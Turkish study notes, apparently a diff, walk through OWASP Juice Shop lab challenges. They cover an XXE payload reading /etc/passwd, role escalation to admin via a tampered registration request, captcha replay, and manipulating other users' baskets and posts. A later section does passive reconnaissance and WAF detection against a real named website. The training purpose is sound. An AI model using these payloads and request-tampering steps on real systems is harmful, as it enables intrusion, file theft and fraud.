+kısmına tıklayarak hangi dosya uzantısındaki dosyaları yükleyebileceğimizi görebiliriz .zip ve .pdf uzantılı dosyaları yollayabildiğimizi 
+görüyoruz complait sayfasında iken sağ tık inspect element yapıyoruz Debugger tabına tıklıyoruz main-es e tıklıyoruz 
+ctrl+f yazıp zip kelimesini aratıyoruz anahtar kelime olarak çünkü zip kullanılan bir inputu bulmak istiyoruz 
+7748. satırda allowedminetypes kısmında complait inputunda upload edilmesine izin verilen dosya türlerini görüyoruz burada .xml in de olduğunu 
+görüyoruz yani bazen browse ditip izin verilen uzantılara bakmak yanıltıcı olabilir bu yüzden debugger dan da kontrol etmeliyiz 
+
+eğer .xml yollayabiliyorsak bu inputta xxe açığı da olabilir    
+
+XXE (XML External Entity) XML Harici Varlık saldırısı, XML girdilerini ayrıştıran bir uygulamaya karşı yapılan bir saldırı türüdür. 
+Bu saldırı, harici bir varlığa referans içeren XML girdisi eksik yapılandırılmış bir XML ayrıştırıcısı ile işlendiğinde gerçekleşir.
+xml bir çok amaç için kullandığımız bir gösterim şeklidir/dilidir sadece html gibi gösterim yapmakla kalmaz bir çok farklı amaçla kullanılabilir 
+android geliştirmede çokça kullanılır çünkü android telefolarda kullanılan uygulamaların arayüzü xml ile yapılır 
+xml küçük bir veritabanı olarak kullanlabilir örneğin kullanıcı verilerinin tutulması işleminde kullanılabilir 
+XML, hem insanlar hem bilgi işlem sistemleri tarafından kolayca okunabilecek dokümanlar oluşturmaya yarayan bir işaretleme dilidir. 
+W3C tarafından tanımlanmış bir standarttır. Bu özelliği ile veri saklamanın yanında farklı sistemler arasında veri alışverişi yapmaya yarayan 
+bir ara format görevi de görür. Extensible Markup Language açılımı budur (Genişletilebilir İşaretleme Dili)
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection bağlantısındaki 
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+i kopyalıyoruz 
+
+ardından kali terminalinde gedit test.xml çalıştırıyoruz ve kopyaladığımız kodu buraya yapıştırıyoruz 
+gedit i kapatıyoruz ve test.xml in oluşturulduğunu görüyoruz tekrar Complaint sayfasına dönüyoruz message kısmına test yazıyoruz 
+Browse butonuna tıklatıp test.xml dosyamızı seçiyoruz oluşturulduğumuz dizinde gözükmesse sağ alttan All Supported Types a tıklayıp 
+gelen seçeneklerden All Files ı seçersek dosyamız gözükecek dosyamızı seçiyoruz daha sonra Open diyoruz son olarak da Submit butonuna tıklıyoruz 
+ve yukarıda yeşil bir bildirim mesajı ile Deprecated Interface challange ımızı çözdüğümüzü göreceğiz (xxe yaptık ama neden bu challange 
+ı tamamlandı sebebini araştır ben anlamadım daha sonra buraya yaz)
+
+bu dersimizde admin haklarıyla kulanıcı oluşturmak (3 Yıldızlı Admin Registration) açığını çözmeye çalışalım 
+öncelikle juice shop dan logout oluyoruz daha sonra User Registration a (kullanıcı oluşturma sayfasına) geliyoruz 
+ardından burp suit i açıyoruz foxyproxy i çalıştırdıktan sonra intercept i açıyoruz 
+daha sonra user registration sayfasına email kısmına test@gmail.com yazıyoruz Password kısmına 123456 diyoruz 
+repeate pasword kısmına 123456 daha sonra security question kısmını mother's maiden name? seçiyoruz Answer kısmına test yazıyoruz 
+daha sonra register a basıyoruz daha sonra burpsuit proxy > intercept kısmından ilk buton olan Forward a basıyoruz 6 defa forward 
+butonuna basıyoruz toplamda şimdi Register isteğimiz geldi eğer bunu da Forward edersek kullanıcı oluşturulacak 
+bu isteğe sağ tık yapıp send to repeater diyoruz daha sonra Repeater tabına geliyoruz sol üstten Send tuşuna basıyoruz 
+sağ tarafta bu isteğe karşılık sayfanın vereceği resbonse u görüyoruz ve oluşacak kulanıcının role(rolü/hakları/yetkisi) customer olduğunu 
+görüyoruz response kısmının çıktısında biz buradaki role u admin yetkisi şeklinde değiştirmek istiyoruz ama register olurken böyle bir 
+seçenek seçmedik peki isteği gönderirken bu rolü nasıl manuel olarak göndereceğiz buna bakalım 
+
+sol taraftaki Request kısmının çıktıısnın olduğu yere geçiyoruz en sondaki 
+*test*,
+role :*admin*
+}
+
+olarak değiştirip yukarıdaki Send butonuna basıyoruz Response kısmında gelen çıktıda role:*admin* olarak gözüküyor 
+şimdi intercept i kapatıyoruz ve juice shop user registration sayfasına geri döndüğümüzde challange tamamladığımızı görebiliriz 
+daha sonra sağ üstteki Account kısmından test@gmail.com 123456 ile giriş yaparsak yeni oluşturduğumuz ve admin yetkilerine sahip olan 
+kullanıcımızla giriş yapmış oluruz  
+
+bu dersimizde juice shop da captcha bypass lama işlemini öğrenelim 
+
+juice shop da customer feedback sayfasına geliyoruz
+sağ tık inspect element diyoruz Network tabına tıklıyoruz alttaki çıktılardan sondan 4. sü /rest/captcha ya tıklıyoruz 
+sağda response tabına geliyoruz ve bu kısmın altındaki 2. kısımda (Response payload) "answer":-4 şeklinde bizden istenen matematiksel doğrulama captcha
+cevabını görebiliriz [her captcha da farklı bir matematiksel işlem sorulur benimkinde de -4 yazmak zorunda değil örnek olarak koydum]
+bu satırın başında captchaId : 11 yazıyor geliştiriciler şöyle bir şey yapmış olabilirler örneğin 20 farklı matematiksel işlem oluşturup 
+sırayla bu işlemleri karşımıza çıkarıp rastgele veya sırayla bitince yeniden bu 20 tanesini tekrar gösterildiği bir döngü / pattern şeklinde 
+kodlamış olabilirler daha sonra intercept i açıyoruz (foxy proxy i de açmayı unutma) bir feedback oluşturuyoruz submit ediyoruz 
+daha sonra burpsuitte 
+
+14. satırda {"UserId:20,
+captchaıd:11
+captcha:-4
+cooment:test
+rating:3 
+
+}
+ şeklinde bir istek gelmiş olması lazım 
+
+ daha sonra bu isteğe sağ tık send to repeater diyoruz daha sonra repeater tabına geliiyoruz sol üstten Send butonuna basıyoruz 
+
+sağ tarafta (Response bölümünde) Raw tabında 
+
+16.satırda {
+    status:success [burası isteğin baaşrılı olduğu anlamına gelen bir response dur]
+}
+
+şeklinde bir ifade var 
+bu isteği sürekli sol üstteki Send butonuna 10 defa basarak yolluyoruz bakalım ne olacak 
+bu şekilde bize 10 saniye içerisinde 10 veya 10dan fazla feedback yolla challangeını intercept i kapattığımızda tamamladığımızı görebiliriz
+
+bu dersimizde de request değiştirme challange ımızı yapalım juice shop da 3 yıldızlı tasklerde Manipulate Basket challangını yapalım 
+bu görevde başkasının sepetine yeni bir ürün eklememiz isteniyor biz zaten önceki derslerde başkasının sepetini görüntülemeyi başarmıştık 
+o yüzden bu görev bizim için kolay 
+şimdi juice shop a sağ üstten normal bir yetkiye sahip kullanıcımızla giriş yapıyoruz ve daha sonra intercept i açıyoruz (foxy proxy i de açmayı unutma)
+ anasayfadaki Apple Juice ı add to basket butonuna basarak sepetimize ekliyoruz daha sonra burp de istediğimiz istek mi yakalanmış onu kontrol 
+ etmek için 14. satıra bakıyoruz 
+
+ {
+     productid:1
+     basketid:8
+     quantity:1
+ }
+[bizde bu değerler farklı olabilir önemli değil]
+ mesajı varsa requestte doğru istektir bu yoksa sol üstten forward etmemiz gerekiyor bu istek gelene kadar 
+
+ bu isteğe sağ tık yapıp send to repeater diyoruz ardından repeater tabına geliyoruz sol üstten send e basarsak 
+ yine status:succes başarılı bir işlem gerçekleştirmiş oluruz yani sepete ekleme işlemi başarılı olacak normalde (ama repeater tabında olduğumuz)
+ için send yaptığımızda bu istek gerçekleştirilmez simülasyon ortmaında (repeater) da olduğumuz için 
+ basketid:( yazıyor bunu değiştirip göndermeyi deneyebiliriz bu değeri 2 yapıp send diyoruz) sağ tarafta error invalid basket id (geçersiz
+ sepet numarası hatası) aldık yani bu id de bir sepet numarası yokmuş bunun sebebi her zaman o basketid nin mevcut olması değil de o sepeti 
+ görüntülemeye iznimiz olabilir ancak buraya yazmaya / bu sepete herhangi bir ürün eklemeye iznimiz olmayabilir bunun için bu hatayı 
+ alıyor olabiliriz veya ilgili isteğin basketid:8 den gelip gelmediği kontrol ediliyor ve gelmediği durumda ilgili işlem engelleniyor olabilir 
+*BasketId*:*8*,
+ *quantity*:1,
+ *BasketId*:*2*
+ } şeklinde değiştiiryoruz diğerleri aynen aynı kalacak !!! ardından sol üstten sen butonuna basıyoruz ve sağ tarafta status:success döndürdü 
+ işlemimiz başarıyla gerçekleşti yani ardından intercept i kapatıyoruz scoreboard ı açıp ilgili challange ı tamamlanmış mı diye 
+ kontrol ediyoruz ve tamamlandığını görüyoruz sağ üstten kendi basket ımıza tıklayıp sağ tık inspct element diyip Storage tabına gidip 
+ Session Storage (sol tarafta) tıklayıp altındaki bağlantıya tıklıyoruz bid satırındaki Value sütununu 2 olarak değiştiriyoruz ve ardından 
+ f5 ile sayfamızı yeniliyoruz veya browserdaki yenileme butonuna basarak böylece hem kendimize hem id si 2 olan kullanıcıya eklemeyi başardık 
+ (ikimize de mi eklendi tam emin değilim onu doğrula buraya yaz) 
+
+ bu dersimizde juice shop dan başkası adına bildirim ve yorum yapma örneğini görelim 
+
+ customer feedback i açıyoruz content test rating:2 starts ve captcha yı yapıyoruz mevcut kullanıcı adımız ile submit edecek zaten customer 
+ feedback i açtığımızda bunun sabit olarak geldiğini - locked bir şekilde- görebiliyoruz daha sonra intercept i açıyoruz (foxy proxy i de açmayı unutma)
+ daha sonra bu feedbackimizi submit ediyoruz şöyle bir request gelmesi gerekiyor 
+
+{
+    UserId
+    captchaId
+    captcha
+    Comment
+    rating
+}
+ 
+ bu isteği send to repater yapıyoruz ve repeater tabına geliyoruz burada email bilgilerimizin comment ile beraber gönderildiğini görüyoruz mevcut olan kullanıcımızdan başka bir mail ile 
+ (xxx@yyy.com) olarak dğeişitriyoruz sadece parantez içerisindeki bölümü değiştiriyoruz ve send e tıklıyoruz sağ kısımda hiç bir çıktı gelmeyebilir 
+ bir kaç defa tıkladığımızda sağda status:success şeklinde yazacaktır ama intercpet i kapattığımızda çözdüğümüze dair yeşil bildirimimiz 
+ gelmedi
+
+ intercep i kapattıktan sonra customer feedback sayfasına sağ tık incpect element diyoruz Inspector tabına geliyoruz 
+ arama kısmına div id feedback form class=form.container ngcontent-tcf-c128 yazıyoruz bu satırın hemen altında gri renkli bir 
+ input id userid class=ng-untouched ng-pristine -valid ngcontent-tcf-c128 type=test hidden satırı var bu satır gizlenmiş (sonundaki hidden 
+ yazısından anlayabiliriz) sondaki hidden=" " kısmını siliyoruz ve entera basıyoruz ve customer feed back sayfamızda arkada yani Author 
+ malini girdiğimiz inputun üstündeki yazının hemen üstünde bir input beliriyor bunun içerisinde de bizim user id miz sayısal bir değer şeklinde 
+ yazılmış burayı değiştirip 16 yazıyoruz 16 olarak gelmişse 18 de yapabiliriz ardından bir rate star vererek bir feedback yoluuyoruz ve submit ediyoruz 
+ ve yukarıda tamamladığımıza dair yani başkası adına bir feedback yollama challangeımızı gerçekleştirdik 
+
+ şimdi de başkası adına bir ürünün altında review (yorum yapmayı öğrenelim) öncelikle anasayfaya gelip apple juice ürününün resmine tıklıyoruz 
+karşımıza küçük bir pencere daha açılacak sayfanın ortasında bu pencerenin en altında write a review (bir yorum yaz) kısmının altınca
+ürünle ilgili yorumlarımızı yazabiliriz biz de admin@juice-sh.op isimli mail adresi adına bu yorumu yapmaya çalışacağız 
+öncelikle intercept i açıyoruz (foxy proxy i de açmayı unutma) ve test yazıp submit ederek yorum isteğimizi burp e gönderiyoruz 
+ardından burp u açıyoruz 
+{
+    message:test
+    author:kayıtlı@emailimiz.com 
+}
+şeklinde bir request gelecek gelmezse forward diyerek gelene kadar forwardlayabiliriz 
+daha sonra bu isteği sağ tık yapıp send to repeater sonra repater tabına geliyoruz yapıyoruz author "admin@juice-sh.op" olarak değğiştiriyoruz 
+tırnak içerisinde sadece admin@juice-sh.op değişeek diğer bütün her şey aynı sol üstten send butonuna basıyoruz sağ tarafta status:seuccess geldi 
+yani işlemimizi başarıyla tamamladık intercept i kapatık juice shop a geliyoruz üstte yeşil bildirimde tamaladığımızı göreibliriz ancak apple juice ürününğn 
+yorumlarında admin@juice-sh.op adresiyle test isimli yorumu görerek bunu doğrulayabiliriz 
+
+bu dersimizde juice shop da eksi sipariş verme konusunu öğrenelim 
+
+payback time (3 yıldızlı) uygulamayı çözelim admin yetkisine sahip olan sahip olan (admin@juice-sh.op) kullanıcımızla
+ juice shop a giriş yapıyoruz ve ürünlerin gösterildiği ana sayfasına tıklıyoruz eğer sepetimizde 5 adet ürün varsa 
+ yeni bir tanesini eklememize izin vermez sitedeki kısıtlamadan doalyı 
+sepetimizdeki bütün ürünleri kaldırıyoruz ardından burp intercept ve foxy proxy i açıyoruz ardından apple juice ürününü add to basket 
+yapıyoruz add to basket dememize rağmen burp isteği yakalamazsa intercept ve foxy proxy i kapatıp açıp tekrar deneyebiliriz 
+istekleri yakaladığında 3 defa forward ediyoruz ta ki 14 satırda 
+
+{
+    *quantity*:2
+}
+
+odunun olduğu isteğe gelene kadar bu isteği send to repeater yapıyoruz ardından repeater tabına geliyoruz 
+ardından sol taraftaki request kısmının altındaki bölümden 
+
+{
+    *quantity*:300
+}
+
+olarak değiştirip sol üstten send diyoruz sağ tarafta bir hata verdi böyle yapınca bundan sadece 5 adet yollayabilirsin dedi 
+peki biz +300 yani 300 tane sepete bu üründen eklemek yerine eksi sipariş versek yani 
+
+{
+    *quantity*:-300 
+}
+
+diyip sol üstten send diyoruz ve sağ tarafta status:success diyor yani eklendi -300 sipariş verdik 
+ardından intercept i kapatıp  juice shop sayfasına geri dönüyoruz ve sağ üstten your basket a tıklıyoruz 
+
+yalnız forwardlamadığımız için hala 1 adet apple juice olarak gözüküyor bu yüzden en baştan sepetimizdeki bütün ürünleri kaldırıp 
+
+intercept ve foxyproxy i açıp apple juice dan 1 tane ekleyip 
+
+14 {
+    productid : 1
+    basketid:1
+    quantity:1
+}
+
+isteği gelene kadar forwardlıyoruz daha sonra sadece quantity deki değeri -300 yapıp forwardlıyoruz 
+az önce büyük ihtimalle aynı request gelmedi çünkü öncekinde sadece quantity geldi bu yüzden hangi üründen hangi sepet e yollayacağı parametreleri 
+gelmediği için sepetimizde -300 sayıda ürün gözükmedi yani repeater dan forwardlamadığımız için değil önceki forwardlamadığın için kısmını sil 
+ardından 10 defa forward tuşuna basıyoruz intercept i kapatıyoruz juice shop sayfasına gidiyoruz ardından sağ üstten your basket a tıklıyoruz 
+ve apple juice - -300 + şeklinde -300 değerini görebiliyoruz ve bunnu hemen sağ altında total price (ödememiz gereken miktarın) -597 birim 
+olduğunu görüyoruz yani bir nevi site bize borçlu çıktı :) ardından  sol alttaki mavi alışveriş sepeti simgessi olan Checkout butonuna 
+basarak ödeme yapabiliriz daha sonra select an address kısmında kayıtlı olan adresi seçiyoruz Z sağ alltan continue diyoruz 
+choose a delivery speed kısmından one day delivery seçeneğini seçiyoruz > sağ alttan continue diyoruz > my payment options > 8108 ile biten 
+kredi kartını seçiyoruz sağ en aşağı da continue ye tıklıyoruz ve ardından açılan sayfada total price kısmında -596 birim sitenin 
+bize ödeme yapacağını söylüyor yani borcumuz -596 alacağımız da 596 birim olmuş olur ve ardından hemen altındaki mavi butondaki 
+place your order and pay butonuna bastığımızda bize bu miktarda paranın gönderilme işlemini gerçekleştiriyoruz 
+
+bu bölümümüzde yaptığımız bu web sızma testlerimizde bugbounty işlemlerine başlamadan önce yapmamız gereken açığını aradığımız site hakkında 
+bilgi toplama aşamasını inceleyeceğiz 
+
+açık aradığımız websitesine whoislookup araması yaapacağız bu aramayla bu ilgili websitesine kim kayıt olmuş onu kim kaıt etmiş hangi domain 
+şirketine kayıt etmiş kayıt eden kişinin adresi ne vs gibi 
+
+https://lookup.icann.org/ adresinden Enter a domain name inputuna atilsamancioglu.com yazıp satırın sonundaki mavi Lookup butonun basıyoruz 
+https://whois.domaintools.com/ adresinde de yine aynı websitesini aratıyoruz ardından tekrar icann den arama yaptığımız sekmeye gidiyoruz 
+icann de pek bir bilgi bulamadık 
+https://whois.domaintools.com/ aramamıza geliyoruz gelen çıktıda IP address satırındaki değer websitesinin barındırıldığı sunucunun ip adresidir 
+icann de de registrar information kısmında godaddy tarafından bu domain in alındığı bilgisine ulaşabiliyoruz
+https://whois.domaintools.com/ da aşağıda i am not a robot captcha sını yapıyoruz bu sonuçlarda sever ın coğrafi lokasyonu arizona, usa olarak 
+gözüküyor domain status satırındaki registered and active website (kayıt edilmiş ve aktif olarak kullanılıyor demek)
+ıp history satırındaki değer 3 yıl içerisinde 2 defa değiştirildiğini söylüyor ip adresinin 
+burada da registrar : satırında (captcha yı yaptıktan sonra gelen çıktıda) hangi şirketin bu domaini kayıt ettiğini -godaddy- 
+görebiliriz regiatrar abuse abuse contact emain ve phone satırlarında bu site ile yetkili sorumlu olan müşteri hizmetlerinin maili ve 
+telefon numarası yazıyor registrant email satırındaki değerde bu domaine hangi mail adresi ile kayıt olunmuş bunu görebiliriz 
+ancak buradaki bilgi engellendiği için farklı bir mail adresi yazıyor güvenlik açısından o mail hacklenirse siteye bir şey olmasın diye
+Name Server: satırı çıktı 2 tane -bu satırda neyin bilgisini veriyor tam anlamadım bunu öğren buraya yaz- 
+
+bu dersimizde dns look up işlemine bakalım 
+https://mxtoolbox.com/DNSLookup.aspx bağlantısına gidip Domain Name inputuna atilsamancioglu.com yazıp DNS Lookup butonuna basıyoruz 
+çok fazla bir sonuç vermedi bize o yüzden 
+
+https://www.robtex.com/ bu bağlantıya gidip www.atilsamancioglu.com u aratıyoruz inputa yazıp GO diyoruz 
+gelen çıktıda Domain name servers başlığının altında name server larımızı görebiliriz 
+
+Ip Number başlığı altında ip numaramız gözüküyor 
+
+Resulta found başlığı altında atilsamancioglu.com un bulunduğu server da başka hangi sunucular da bulunduruluyor bunu görebiliriz 
+çıktıda bize verdiği ip üzerinden bir sorgu yapabiliri bunun içiin bing.com u kullanalım 
+
+https://www.bing.com/ a gidip arama kısmına gelip ip: 160.153.128.32 yazıp enterlıyoruz ve atıl samancıoğlunun web sitesi dahil pek başka bir 
+kaç tane de websitesi çıktı ancak bu ip adresini kali terminalde ping atilsamancioglu.com çalıştırarak da bulabiliriz ping den gelen çıktıyı 
+bing de ip: xxx.xxx.xxx.xxx şeklinde aratarak 
+
+bu dersimizde pasif veri toplama işlemlerinden bir diğeri olan https://www.netcraft.com/ sitesinden sorgu yapalım 
+ping atmak aktif veri toplama işlemidir, nmap sorgusu da aktif veri toplamaya girer 
+dns, ip look up ise pasif bilgi toplama işlemleridir 
+
+https://sitereport.netcraft.com/ adresine geliyoruz atilsamancioglu.com yazıp Lookup butonuna basıyoruz Gelen çıktılardan ilk bölümün 
+hemen sağında Netcraft Risk Rating (risk puanı) nın 1/10 olduğunu görüyoruz risk puanı arttıkça o sitenin risk seviyesinin arttığını söyleyebilriz 
+(o site risklidir diyebiliriz)
+
+Netblock Owner satırındaki değer domain in nereden alındığını gösteriyor Ip Address satırında sunucunun ip adresini görüyoruz 
+
+https://www.atilsamancioglu.com diye lookup edilince public key algorithm satırında ssl de nasıl bir encryption yapıldığını (hangi encryption 
+algoritmasının kullanıldığı bilgisi veriliyor bize) certificate revocation list kısmında sitemizin sertifikalarının nereden alındığı bilgisi veriliyor 
+
+sender policy frame work başlığında bu websitesi / hosting adına kim e mail yollayabilir bunun test edildiği bir kısımdır 
+(burayı anlamadım tam araştır süreç nasıl oluyor başkası adına mail yollanarak nasıl bir zaafiyet ortaya çıkar bunu iyice araştır) 
+
+site technology başlığı altında site oluştururken kullanılan yazılım teknolojilerini/programlama dillerini vs gösterir 
+bunu bilmemizin önemi şudur örneğin sitenin hangi teknoloji kullanılarak oluşturulduğunu bilirsek o dilde yazılırken hangi noktalarda zaafiyetli kod 
+yazılmış olabileceğini tespit edip hacklememiz daha kolaylaşacaktır (yazılımcı burayı kodlarken unuttuğu/ hatalı kodladığı kısım neresi diye düşünerek)
+
+client-side başlığı altında javascript kullanıldığını görüyoruz 
+
+client-side scripting framework kısmında istemci tarafında hangi frameworklerin kullanıldığını görebiliriz 
+
+blog başlığı altında wordpress kullanıldığı gözüküyor 
+
+bu dersimizde sızma testi / pentest / bugbounty işlemlerimize başlamadan önce bakmamız gereken şey acaba sitede bir firewall var mı bunu öğren 
+mektir yazılımda bir açık mevcut oalbilir sitede ama firewall bunu koruyor olabilir bunu kontrol etmek için kali linux da hazır bir araç 
+vardır ismi de wafw00f 
+
+kali terminaline gekip wafw00f atilsamancioglu.com çalıştırıyoruz gelen çıktıda The site www.atilsamancioglu.com is behind Wordfence (Defiant) 
+WAF yazan kısımda Wordfence (Defiant) WAF site kullanılan firewall un ismidir 
+
+https://pentestit.medium.com/bypassing-waf-4cfa1aad16bf bağlantısında WAF (Web Application Firewall) ları nasıl bypass edebileceğimizi (atlatabileceğimizi)
+öğrenebiliriz 
+
+diğer bir kullanabileceğimiz tool da lbd (load balancing detector) eğer yoğun bir internet trafiği alan bir websiteye sızmaya çalışıyorsak 
+bu aracı kullanabiliriz lbd de çok fazla trafik alan bir websitesinin bu trafiği dengelemesi için kullandığı bir sistemdir 
+gelen trafiği farklı ip lere farklı sunuculara yolluyorlar istekleri bunu görmek şuna olanak tanır kali terminaline gelip 
+lbd atilsamancioglu.com çalıştırdığımızda bizim sitemizde bir load balancing detector olmadığı için NOT FOUND çıktısı alacağız 
+
+wordpress bir content managment system (içerik yönetim sistemidir) ve bir çok websitesi wordpress kullanır 
+
+vulnhub.com da zaafiyete sahip ve hacklenmesi için yayınlanan pek çok sanal makine bulunur 
+
+wordpress kullanan bir sunucuya sahip stapler 1 zaafiyetli makinesinin ctf çözümü için 
+https://www.youtube.com/watch?v=E1Tzltr8g7Q&list=PLT1Gj1RmR7vrVKuGDT4n5NCUTZNh2ifK1 videosunu izleyebiliriz 
+
+stapler1 i de https://www.vulnhub.com/entry/stapler-1,150/ bağlantısından indirebiliriz 
+
+
+
+
+
+
+
+
+
+
